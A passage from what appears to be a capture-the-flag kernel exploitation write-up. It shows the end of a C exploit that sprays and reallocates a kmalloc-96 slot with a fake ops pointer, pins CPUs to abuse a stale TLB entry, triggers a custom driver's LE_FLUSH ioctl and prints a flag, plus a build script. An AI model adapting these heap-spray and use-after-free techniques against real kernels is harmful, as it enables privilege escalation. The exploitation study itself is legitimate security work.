     * Messages were sprayed on CPU 0.  Free/reallocate the matched message
     * there so the per-CPU kmalloc-96 freelist returns the exact stale slot.
     * Return to CPU 1 before FLUSH: only CPU 1 lacks the stale user TLB entry.
     */
    pin_cpu(0);
    replace_message(queues[hit.queue], &hit, fake_ops | 4ULL);
    __sync_synchronize();
    pin_cpu(1);

    dprintf(1, "[*] FLUSH trigger fd=%d fake_ops=%#lx target=%#lx\n",
            trigger_fd, (unsigned long)fake_ops,
            (unsigned long)(supervisor + 0x200));
    if (ioctl(trigger_fd, LE_FLUSH, 0) != 0)
        die("LE_FLUSH trigger");

    print_flag();
    return 0;
}
```

### `build.sh`

```sh
#!/bin/sh
set -eu

CC="${CC:-gcc}"
"$CC" -O2 -static -Wall -Wextra -Werror -o exploit exploit.c
sha256sum exploit
```
